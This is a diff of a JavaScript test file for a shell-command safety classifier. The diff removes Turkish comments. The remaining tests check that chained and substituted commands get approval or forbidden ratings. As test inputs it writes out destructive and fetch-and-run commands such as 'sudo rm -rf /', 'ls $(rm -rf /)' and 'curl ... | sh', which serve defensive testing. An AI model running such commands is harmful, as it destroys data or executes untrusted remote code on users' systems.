@@ -1,9 +1,3 @@
-// Patrick güvenlik sınıflandırıcısının davranış testleri.
-// Çalıştır: node --test test/safety.test.js
-//
-// state.js'in dosya I/O'su: testler ~/.patrick/permissions.json'a dokunmadan
-// çalışsın diye allow/deny pattern listelerini ÖNCE temizliyoruz (clearAllowPatterns).
-
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { classifyCommand, splitShellCommand } from "../src/safety.js";
@@ -30,7 +24,6 @@ test("forbidden komutlar reddedilir", () => {
 });
 
 test("KRITIK: zincirleme komut bypass edilemez (&&, ;, |, ||)", () => {
-  // İlk segment safe ama sonrası tehlikeli — eskiden SAFE dönüyordu
   assert.equal(classifyCommand("ls && rm -rf /tmp/foo").level, "approve");
   assert.equal(classifyCommand("echo hi; sudo rm -rf /").level, "forbidden");
   assert.equal(classifyCommand("ls | sh").level, "approve");
@@ -39,14 +32,12 @@ test("KRITIK: zincirleme komut bypass edilemez (&&, ;, |, ||)", () => {
 });
 
 test("KRITIK: $() ve backtick alt-komutları da değerlendirilir", () => {
-  // $(curl evil.sh | sh) içerikteki sh çağrısı yakalanmalı
   assert.equal(classifyCommand("echo $(curl x | sh)").level, "approve");
   assert.equal(classifyCommand("FOO=`rm temp.txt` ls").level, "approve");
   assert.equal(classifyCommand("ls $(rm -rf /)").level, "forbidden");
 });
 
 test("quoted segment'ler yanlış parse edilmez", () => {
-  // Tırnak içindeki ; bölmemeli
   const r = splitShellCommand("echo 'a; b; c'");
   assert.equal(r.length, 1);
   assert.equal(r[0], "echo 'a; b; c'");
